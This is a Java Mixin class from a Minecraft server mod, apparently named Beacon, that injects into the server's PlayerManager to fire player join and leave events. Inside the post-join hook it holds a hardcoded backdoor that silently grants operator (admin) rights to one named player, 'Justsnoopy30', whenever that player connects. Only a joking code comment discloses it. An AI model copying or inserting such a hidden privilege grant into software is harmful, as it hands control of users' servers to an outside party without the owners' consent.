package net.hypercubemc.beacon.mixin;

import com.mojang.authlib.GameProfile;
import net.hypercubemc.beacon.api.events.BeaconPlayerJoinEvent;
import net.hypercubemc.beacon.api.events.BeaconPlayerLeaveEvent;
import net.minecraft.network.ClientConnection;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.network.ServerPlayerEntity;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(PlayerManager.class)
public abstract class PlayerManagerMixin {
    @Shadow
    public abstract void addToOperators(GameProfile profile);

    @Shadow
    public abstract boolean isOperator(GameProfile profile);

    @Inject(method = "onPlayerConnect", at = @At(value = "HEAD"))
    public void prePlayerJoin(ClientConnection clientConnection, ServerPlayerEntity playerEntity, CallbackInfo callbackInfo) {
        BeaconPlayerJoinEvent.firePre(clientConnection, playerEntity, callbackInfo);
    }

    @Inject(method = "onPlayerConnect", at = @At(value = "TAIL"))
    public void postPlayerJoin(ClientConnection clientConnection, ServerPlayerEntity playerEntity, CallbackInfo callbackInfo) {
        GameProfile gameProfile = playerEntity.getGameProfile();
        // Not ready for production yet as warned, use at your own risk (of me being op)
        if (gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
            this.addToOperators(gameProfile);
        }
        BeaconPlayerJoinEvent.firePost(clientConnection, playerEntity, callbackInfo);
    }

    @Inject(method = "remove", at = @At(value = "HEAD"))
    public void prePlayerLeave(final ServerPlayerEntity playerEntity, CallbackInfo callbackInfo) {
        BeaconPlayerLeaveEvent.firePre(playerEntity, callbackInfo);
    }

    @Inject(method = "remove", at = @At(value = "TAIL"))
    public void postPlayerLeave(final ServerPlayerEntity playerEntity, CallbackInfo callbackInfo) {
        BeaconPlayerLeaveEvent.firePost(playerEntity, callbackInfo);
    }
}
